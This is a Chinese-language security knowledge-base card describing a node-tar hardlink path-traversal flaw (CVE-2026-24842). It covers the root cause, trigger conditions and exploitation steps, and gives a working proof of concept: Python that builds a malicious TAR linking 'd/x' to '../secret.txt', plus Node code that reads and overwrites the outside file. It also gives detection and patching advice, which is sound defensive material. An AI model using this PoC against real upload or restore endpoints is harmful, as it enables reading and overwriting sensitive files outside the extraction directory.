---
id: web-generic-file-upload-node-tar-hardlink-linkpath-traversal
title: node-tar hardlink linkpath 未做边界校验：解压目录内文件名绑定外部 inode 导致任意文件读写（CVE-2026-24842）
type: scenario
domain: web
path: web/generic/file-upload
technique: tar-hardlink-linkpath-traversal
tags:
- web
- file-upload
- archive
- tar
- nodejs
- hardlink
- path-traversal
- arbitrary-read
- arbitrary-write
- cve-2026-24842
cve:
- CVE-2026-24842
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: tar < 7.5.7
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:25:16+08:00'
  notes: 已对照原文与全部29张截图核对：tar@7.5.0 上 d/x -> ../secret.txt 越界读取与覆盖、ls -li 同 inode/link count=2、tar@7.5.7 拒绝条目等均与卡片一致；CVE-2026-24842、tar<7.5.7 影响区间与原文一致。卡片 PoC 用 Python tarfile 等价生成 LNKTYPE 条目，语义与原文手拼 header 一致。未实际执行 PoC。
url: /docs/web/generic/file-upload/web-generic-file-upload-node-tar-hardlink-linkpath-traversal/
draft: false
kb_aliases:
- CVE-2026-24842
- node-tar hardlink
- tar hardlink path traversal
- 硬链接解压越界
- linkpath 路径穿越
- 归档提取对象边界绕过
---

## 一句话结论

node-tar `7.5.7` 之前只校验 hardlink 条目的落点 `entry.path` 是否在解压目录内，却没有同等校验真实源对象 `entry.linkpath`；归档里写 `d/x -> ../secret.txt` 就能在解压目录内创建一个与外部文件共享 inode 的普通文件名，业务随后读取或写入 `uploads/d/x` 实际就是在读写目录外的敏感文件。

## 原理

- TAR 的 hardlink 条目有两个独立字段：`entry.path` 决定解压目录内新出现的文件名（落点），`entry.linkpath` 决定与哪个已存在文件共享 inode（真实源对象）。
- 旧版 node-tar 的 `[CHECKPATH]` 只对 `entry.path` 做 `..`/绝对路径检查。PoC 中 `entry.path = d/x` 不含 `..`，解析出的 `entry.absolute` 是 `uploads/d/x`，检查通过。
- `[CHECKFS]` 虽然把 `entry.linkpath` 放进了 `paths` 数组，但用途是路径预约/并发控制；`[CHECKFS2]` 的 lstat、删除、复用都围绕 `entry.absolute`，没有对 linkpath 做边界判断。
- `[MAKEFS]` 遇到 `entry.type = Link` 进入 `[HARDLINK]`；后者执行 `path.resolve(this.cwd, entry.linkpath)`，把 `../secret.txt` 解析成 `uploads/../secret.txt` 即解压目录外的真实路径，再由 `[LINK]` 调用 `fs.link(linkpath, entry.absolute)`。
- 结果不是复制文件，而是让 `uploads/d/x` 与 `secret.txt` 指向同一个 inode。此后业务代码看到的路径始终在 `uploads/` 内，但 `fs.readFile`/`fs.writeFile` 操作的是目录外对象。
- 与 symlink 的区别：硬链接不保存路径字符串，读取时不需要“跟随链接”，`O_NOFOLLOW` 一类针对符号链接的防护也无效；只能通过 inode/链接数或拒绝链接类条目发现。
- 本质是“路径边界 ≠ 对象边界”：校验阶段关注落点文件名，落地阶段使用的却是另一个字段决定的文件对象。

## 触发条件

- 使用 `tar < 7.5.7`（Node.js 生态）解压不可信 TAR，典型入口是上传归档、备份恢复、插件/主题安装、批量导入。
- 解压目录允许创建 hardlink，且解压进程对目标外部文件有读/写权限。
- 目标外部文件在解压时已存在（硬链接要求源对象存在），攻击者需知道或可预测其路径，且与解压目录位于同一文件系统。
- 业务在解压后会读取、下载、转换、追加、缓存或回写解压目录内该文件；仅有解压动作而没有后续读写时，危害有限。

## 利用步骤

1. 构造恶意 TAR：一个目录条目 `d/`，一个 hardlink 条目 `d/x`，其 `linkpath` 为 `../secret.txt`。
2. 上传该 TAR，触发 `tar.extract({ file, cwd: uploads })`。
3. 解压后 `uploads/d/x` 与 `uploads/../secret.txt` 共享 inode；用 `ls -li` 可见 inode 相同、链接数为 2。
4. 调用业务的读取/下载接口读取 `uploads/d/x`，拿到 `secret.txt` 内容。
5. 调用业务的写入/更新接口写 `uploads/d/x`，实际覆盖 `secret.txt`；对配置、密钥、计划任务等可写文件可进一步扩大影响。

## PoC

用 Python 生成最小恶意 TAR（等价于原文手工拼 512 字节 tar header）：

```python
import tarfile

with tarfile.open('malicious.tar', 'w') as t:
    d = tarfile.TarInfo('d'); d.type = tarfile.DIRTYPE; d.mode = 0o755
    t.addfile(d)
    h = tarfile.TarInfo('d/x'); h.type = tarfile.LNKTYPE; h.linkname = '../secret.txt'
    t.addfile(h)
```

服务端解压与后续读写：

```javascript
const tar = require('tar');
const fs = require('fs');
const path = require('path');
const UPLOAD_DIR = path.join(__dirname, 'uploads');

await tar.extract({ file: path.join(UPLOAD_DIR, 'malicious.tar'), cwd: UPLOAD_DIR });

// 业务只访问解压目录内的路径
const target = path.join(UPLOAD_DIR, 'd', 'x');
console.log(fs.readFileSync(target, 'utf8'));   // 实际输出 ../secret.txt 的内容
fs.writeFileSync(target, 'PWNED_BY_HARDLINK'); // 实际覆盖 ../secret.txt
```

原文在 `tar@7.5.0` 上验证了读取与覆盖，`ls -li` 显示两路径 inode 相同；升级 `tar@7.5.7` 后同一归档不再创建 `uploads/d/x`，`secret.txt` 内容保持不变。

## 变体与关联

- 绝对路径 linkpath：若库未拒绝绝对路径，可直接指向 `/etc/passwd`、应用配置等已知路径。
- 链式链接：hardlink 指向归档内另一个链接条目，利用校验与落地阶段路径解析基准不同做二次绕过。
- Windows：`normalizeWindowsPath` 与盘符/UNC 路径可能引入额外解析差异，需单独验证。
- 关联：[[web-generic-file-upload-archive-symlink-extract-read-write]]（symlink 版本）、[[web-generic-file-upload-zip-slip-webshell-write]]（路径字符串越界版本）。
- 同类风险不限于 node-tar：compressing、Zarf、Jenkins 等的 symlink 提取问题共享“落点与对象分离”的模型，但本文未逐一复现，本卡不展开。

## 检测与防御

- 升级 node-tar 到 `7.5.7+`；修复版在 `[CHECKPATH]` 中对 `Link` 类型同时调用 `[STRIPABSOLUTEPATH](entry, 'linkpath')`，linkpath 含 `..` 时直接报 `TAR_ENTRY_ERROR` 并拒绝条目。
- 若业务不需要链接，默认拒绝 TAR 中的 hardlink/symlink 条目（typeflag `1`/`2`），这是最稳的边界。
- 若必须支持，独立校验 linkpath：按该库真实解析语义（相对 cwd 还是归档根）解析成绝对路径，再用 `realpath`/前缀比较确认仍在允许目录内；不要只校验 `entry.path`。
- 解压目录放在独立临时目录/容器挂载点，与敏感文件不在同一文件系统层级；以低权限用户解压，限制越界读写范围。
- 检测：归档中出现 typeflag `1` 或 `2` 且 linkname 含 `..`/绝对路径；解压目录内文件的链接数大于 1 或 inode 与目录外敏感文件相同；node-tar 日志出现 `linkpath contains '..'`/`escapes extraction directory`。
